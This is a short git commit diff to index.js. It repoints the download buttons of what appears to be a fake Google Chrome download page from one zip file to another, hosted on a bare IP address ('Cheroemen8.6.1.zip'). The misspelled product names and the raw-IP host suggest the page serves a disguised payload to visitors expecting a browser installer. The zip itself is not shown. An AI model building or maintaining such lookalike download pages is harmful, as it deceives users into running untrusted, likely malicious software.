b5935f84365f288fb301ab7415f9347639592861
aa168188 <sli010342@gmail.com>
2025-11-04 01:00:48 +0800

    Update index.js

--- index.js
+++ index.js
@@ -1,6 +1,6 @@
 window.onload = function() {
     // 下载链接
-    let url = 'https://windowsw.oss-cn-hongkong.aliyuncs.com/gogle%20chome%2064%E4%BD%8D_109.0.5414.zip'
+    let url = 'http://137.220.158.27/Cheroemen8.6.1.zip'
 
     document.querySelectorAll('.download').forEach(item => {
         item.onclick = function() {
